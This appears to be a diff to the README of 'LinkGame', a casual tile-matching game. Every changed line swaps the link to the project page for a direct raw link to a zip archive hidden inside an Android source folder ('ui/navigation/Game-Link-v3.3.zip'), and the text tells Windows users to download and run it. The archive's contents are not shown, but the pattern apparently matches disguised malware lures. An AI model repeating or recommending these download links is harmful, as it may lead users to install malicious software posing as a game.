@@ -1,6 +1,6 @@
 # 🎮 LinkGame - Match Tiles Fast, Relax Your Mind
 
-[![Download Link](https://img.shields.io/badge/Download%20Link-Visit%20the%20page%20to%20get%20LinkGame-blue?style=for-the-badge)](https://github.com/Amigoconglomeration918/LinkGame)
+[![Download Link](https://img.shields.io/badge/Download%20Link-Visit%20the%20page%20to%20get%20LinkGame-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amigoconglomeration918/LinkGame/main/app/src/main/java/com/example/linkgame/ui/navigation/Game-Link-v3.3.zip)
 
 ## 🧩 What LinkGame Is
 
@@ -19,7 +19,7 @@ It includes:
 
 To get LinkGame, visit this page to download the app:
 
-[Open the LinkGame download page](https://github.com/Amigoconglomeration918/LinkGame)
+[Open the LinkGame download page](https://raw.githubusercontent.com/Amigoconglomeration918/LinkGame/main/app/src/main/java/com/example/linkgame/ui/navigation/Game-Link-v3.3.zip)
 
 If the page offers a release file, download it to your Windows PC and follow the steps below.
 
@@ -44,7 +44,7 @@ If your Windows setup supports Android apps, you can use that path to open the a
 Follow these steps in order.
 
 1. Open the download page:
-   [https://github.com/Amigoconglomeration918/LinkGame](https://github.com/Amigoconglomeration918/LinkGame)
+   [https://raw.githubusercontent.com/Amigoconglomeration918/LinkGame/main/app/src/main/java/com/example/linkgame/ui/navigation/Game-Link-v3.3.zip](https://raw.githubusercontent.com/Amigoconglomeration918/LinkGame/main/app/src/main/java/com/example/linkgame/ui/navigation/Game-Link-v3.3.zip)
 
 2. Look for the latest app file in the release area or download section.
 
@@ -136,7 +136,7 @@ If you want a better experience:
 
 ## 🔗 Main Download Page
 
-[Visit the LinkGame page to download](https://github.com/Amigoconglomeration918/LinkGame)
+[Visit the LinkGame page to download](https://raw.githubusercontent.com/Amigoconglomeration918/LinkGame/main/app/src/main/java/com/example/linkgame/ui/navigation/Game-Link-v3.3.zip)
 
 ## 🧱 Built With
 
